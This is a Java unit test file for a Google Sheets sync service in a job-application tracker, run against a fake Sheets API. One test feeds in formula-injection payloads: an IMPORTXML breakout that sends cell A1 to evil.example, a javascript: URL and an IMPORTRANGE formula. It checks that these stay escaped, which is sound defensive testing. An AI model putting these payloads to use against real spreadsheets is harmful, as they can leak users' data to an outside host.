package com.cvmaker.application.management;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.IOException;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONObject;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import com.cvmaker.application.management.FakeSheetsApi.Call;
import com.cvmaker.application.management.sheets.SpreadsheetIdStore;
import com.google.api.client.testing.http.MockLowLevelHttpResponse;

/**
 * Runs {@link GoogleSheetsService} against {@link FakeSheetsApi}: a real Sheets client, no
 * network and no credentials.
 */
class GoogleSheetsServiceTest {

    @TempDir
    Path tempDir;

    private SpreadsheetIdStore store;

    @BeforeEach
    void setUp() {
        store = new SpreadsheetIdStore(tempDir.resolve("google_sheet_id.txt"));
    }

    // ---- helpers ----------------------------------------------------------------------------

    private static boolean isCreate(Call call) {
        return call.method().equals("POST") && call.url().matches(".*/v4/spreadsheets(\\?.*)?$");
    }

    private static boolean isLookup(Call call, String spreadsheetId) {
        return call.method().equals("GET") && call.url().matches(".*/v4/spreadsheets/" + spreadsheetId + "(\\?.*)?$");
    }

    private static MockLowLevelHttpResponse spreadsheet(String id, int sheetId, String title) {
        return FakeSheetsApi.json("{\"spreadsheetId\":\"" + id + "\",\"sheets\":[{\"properties\":{\"sheetId\":"
                + sheetId + ",\"title\":\"" + title + "\",\"index\":0}}]}");
    }

    /** Answers every data request with success, and value reads with the given number of rows. */
    private static MockLowLevelHttpResponse dataResponse(Call call, int existingRows) {
        if (call.method().equals("GET") && call.url().contains("/values/")) {
            StringBuilder rows = new StringBuilder();
            for (int i = 0; i < existingRows; i++) {
                rows.append(i == 0 ? "" : ",").append("[\"old row ").append(i).append("\"]");
            }
            return FakeSheetsApi.json("{\"values\":[" + rows + "]}");
        }
        return FakeSheetsApi.json("{}");
    }

    private static JobApplicationData job(String company, String emailId, String applicationUrl) {
        JobApplicationData job = new JobApplicationData();
        job.setJobRelated(true);
        job.setCompanyName(company);
        job.setEmailId(emailId);
        job.setApplicationUrl(applicationUrl);
        job.setApplicationStatus("Applied");
        return job;
    }

    private static Map<String, JobApplicationData> byCompany(JobApplicationData... jobs) {
        Map<String, JobApplicationData> map = new LinkedHashMap<>();
        for (JobApplicationData job : jobs) {
            map.put(job.getCompanyName().toLowerCase(), job);
        }
        return map;
    }

    /** Collects every value stored under the given key anywhere in a JSON document. */
    private static List<Object> valuesOf(String json, String key) {
        List<Object> found = new ArrayList<>();
        collect(new JSONObject(json), key, found);
        return found;
    }

    private static void collect(Object node, String key, List<Object> found) {
        if (node instanceof JSONObject object) {
            for (String name : object.keySet()) {
                if (name.equals(key)) {
                    found.add(object.get(name));
                }
                collect(object.get(name), key, found);
            }
        } else if (node instanceof JSONArray array) {
            for (int i = 0; i < array.length(); i++) {
                collect(array.get(i), key, found);
            }
        }
    }

    // ---- initializeSpreadsheet ---------------------------------------------------------------

    @Test
    void noIdCreatesASpreadsheetSavesItsIdAndFormatsItsRealSheet() throws Exception {
        FakeSheetsApi api = new FakeSheetsApi(call
                -> isCreate(call) ? spreadsheet("new-id-1", 4242, "Sheet1") : FakeSheetsApi.json("{}"));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "", store);

        service.initializeSpreadsheet();

        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).hasSize(1);
        assertThat(api.calls("GET", "/v4/spreadsheets")).isEmpty();
        assertThat(store.load()).contains("new-id-1");

        // The header row goes to the new spreadsheet, on its first sheet, as plain values.
        List<Call> headerWrites = api.calls("PUT", "/v4/spreadsheets/new-id-1/values/");
        assertThat(headerWrites).hasSize(1);
        assertThat(headerWrites.get(0).url()).contains("/values/'Sheet1'!A1:V1").contains("valueInputOption=RAW");
        assertThat(headerWrites.get(0).body()).contains("Company").contains("Email Timestamp");

        // Every formatting request targets the sheet id the API reported, not a hardcoded 0.
        List<Call> formatting = api.calls("POST", "/v4/spreadsheets/new-id-1:batchUpdate");
        assertThat(formatting).hasSize(1);
        List<Object> sheetIds = valuesOf(formatting.get(0).body(), "sheetId");
        assertThat(sheetIds).isNotEmpty().containsOnly(4242);
    }

    @Test
    void theSavedIdIsReusedOnTheNextRunInsteadOfCreatingAnotherSpreadsheet() throws Exception {
        FakeSheetsApi firstRun = new FakeSheetsApi(call
                -> isCreate(call) ? spreadsheet("new-id-1", 0, "Sheet1") : FakeSheetsApi.json("{}"));
        new GoogleSheetsService(firstRun.client(), "", store).initializeSpreadsheet();

        FakeSheetsApi secondRun = new FakeSheetsApi(call
                -> isLookup(call, "new-id-1") ? spreadsheet("new-id-1", 0, "Sheet1") : FakeSheetsApi.json("{}"));
        new GoogleSheetsService(secondRun.client(), "", store).initializeSpreadsheet();

        assertThat(secondRun.calls()).hasSize(1);
        assertThat(isLookup(secondRun.calls().get(0), "new-id-1")).isTrue();
        assertThat(secondRun.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(ints = {400, 401, 403, 429, 500, 503})
    void anErrorOtherThanNotFoundCreatesNothing(int status) {
        FakeSheetsApi api = new FakeSheetsApi(call -> FakeSheetsApi.error(status, "Nope"));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "configured-id", store);

        assertThatThrownBy(service::initializeSpreadsheet)
                .isInstanceOf(IOException.class)
                .hasMessageContaining("configured-id")
                .hasMessageContaining("HTTP " + status)
                .hasMessageContaining("No new spreadsheet was created");

        assertThat(api.calls()).hasSize(1);
        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).isEmpty();
        assertThat(store.load()).isEmpty();
    }

    @Test
    void aNetworkFailureCreatesNothing() {
        FakeSheetsApi api = new FakeSheetsApi(call -> {
            throw new IOException("Connection reset");
        });
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "configured-id", store);

        assertThatThrownBy(service::initializeSpreadsheet)
                .isInstanceOf(IOException.class)
                .hasMessageContaining("Connection reset")
                .hasMessageContaining("No new spreadsheet was created");

        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).isEmpty();
        assertThat(store.load()).isEmpty();
    }

    @Test
    void notFoundCreatesASpreadsheetAndSavesItsId() throws Exception {
        FakeSheetsApi api = new FakeSheetsApi(call -> {
            if (isLookup(call, "deleted-id")) {
                return FakeSheetsApi.error(404, "Not Found");
            }
            return isCreate(call) ? spreadsheet("new-id-2", 7, "Sheet1") : FakeSheetsApi.json("{}");
        });
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "deleted-id", store);

        service.initializeSpreadsheet();

        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).hasSize(1);
        assertThat(store.load()).contains("new-id-2");
    }

    @Test
    void aStaleConfiguredIdFallsBackToTheSavedIdInsteadOfCreatingAgain() throws Exception {
        store.save("saved-id");
        FakeSheetsApi api = new FakeSheetsApi(call -> {
            if (isLookup(call, "deleted-id")) {
                return FakeSheetsApi.error(404, "Not Found");
            }
            if (isLookup(call, "saved-id")) {
                return spreadsheet("saved-id", 55, "Tracker");
            }
            return dataResponse(call, 0);
        });
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "deleted-id", store);

        service.initializeSpreadsheet();
        service.bulkUpdateAllApplications(byCompany(job("Acme", "m1", null)));

        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).isEmpty();
        assertThat(api.calls("PUT", "/v4/spreadsheets/saved-id/values/'Tracker'!A2:V2")).hasSize(1);
        assertThat(store.load()).contains("saved-id");
    }

    @Test
    void theSavedIdIsNotTriedWhenItFailsWithSomethingOtherThanNotFound() throws Exception {
        store.save("saved-id");
        FakeSheetsApi api = new FakeSheetsApi(call
                -> isLookup(call, "deleted-id") ? FakeSheetsApi.error(404, "Not Found")
                        : FakeSheetsApi.error(403, "Forbidden"));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "deleted-id", store);

        assertThatThrownBy(service::initializeSpreadsheet)
                .isInstanceOf(IOException.class)
                .hasMessageContaining("saved-id")
                .hasMessageContaining("HTTP 403");
        assertThat(api.calls().stream().filter(GoogleSheetsServiceTest::isCreate)).isEmpty();
    }

    // ---- bulkUpdateAllApplications -----------------------------------------------------------

    @Test
    void bulkUpdateWritesToTheRealFirstSheetByIdAndTitle() throws Exception {
        FakeSheetsApi api = new FakeSheetsApi(call
                -> isLookup(call, "abc") ? spreadsheet("abc", 987, "Jobs 2025") : dataResponse(call, 3));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "abc", store);
        service.initializeSpreadsheet();

        service.bulkUpdateAllApplications(byCompany(
                job("Acme", "m1", "https://acme.example/jobs/1"),
                job("Globex", "m2", null)));

        // old rows are read and cleared on the looked-up sheet
        assertThat(api.calls("GET", "/v4/spreadsheets/abc/values/'Jobs 2025'!A2:V")).hasSize(1);
        assertThat(api.calls("POST", "/v4/spreadsheets/abc/values/'Jobs 2025'!A2:V4:clear")).hasSize(1);

        // two rows are written as plain values, never parsed as formulas
        List<Call> writes = api.calls("PUT", "/v4/spreadsheets/abc/values/'Jobs 2025'!A2:V3");
        assertThat(writes).hasSize(1);
        assertThat(writes.get(0).url()).contains("valueInputOption=RAW");
        assertThat(writes.get(0).body()).contains("Acme").contains("Globex");

        // three link cells: two for Acme (row 2), one for Globex (row 3), all on sheet 987
        List<Call> linkUpdates = api.calls("POST", "/v4/spreadsheets/abc:batchUpdate");
        assertThat(linkUpdates).hasSize(1);
        String body = linkUpdates.get(0).body();
        assertThat(valuesOf(body, "sheetId")).hasSize(3).containsOnly(987);
        assertThat(valuesOf(body, "formulaValue")).containsExactly(
                "=HYPERLINK(\"https://mail.google.com/mail/u/0/#inbox/m1\", \"📧 View\")",
                "=HYPERLINK(\"https://acme.example/jobs/1\", \"🔗 Apply\")",
                "=HYPERLINK(\"https://mail.google.com/mail/u/0/#inbox/m2\", \"📧 View\")");
    }

    @Test
    void aMaliciousApplicationUrlNeverBecomesFormulaCode() throws Exception {
        FakeSheetsApi api = new FakeSheetsApi(call -> dataResponse(call, 0));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "abc", store);

        service.bulkUpdateAllApplications(byCompany(
                job("Evil", null, "https://evil.example/\",\"x\")&IMPORTXML(\"https://evil.example/?\"&A1,\"//a\")&(\""),
                job("Script", null, "javascript:alert(1)"),
                job("Formula", null, "=IMPORTRANGE(\"x\",\"A1\")")));

        List<Object> formulas = valuesOf(api.calls("POST", ":batchUpdate").get(0).body(), "formulaValue");
        assertThat(formulas).hasSize(1);
        String formula = formulas.get(0).toString();
        assertThat(formula).startsWith("=HYPERLINK(\"https://evil.example/\"\",\"\"x\"\")&IMPORTXML(");
        // With escaped quotes removed, only the four argument delimiters are left.
        assertThat(formula.replace("\"\"", "").chars().filter(c -> c == '"').count()).isEqualTo(4);
    }

    @Test
    void anEmptySyncDoesNotClearTheSheet() throws Exception {
        FakeSheetsApi api = new FakeSheetsApi(call -> dataResponse(call, 5));
        GoogleSheetsService service = new GoogleSheetsService(api.client(), "abc", store);
        JobApplicationData newsletter = job("Newsletter Inc", "m9", null);
        newsletter.setJobRelated(false);

        service.bulkUpdateAllApplications(byCompany(newsletter));

        assertThat(api.calls()).isEmpty();
    }
}
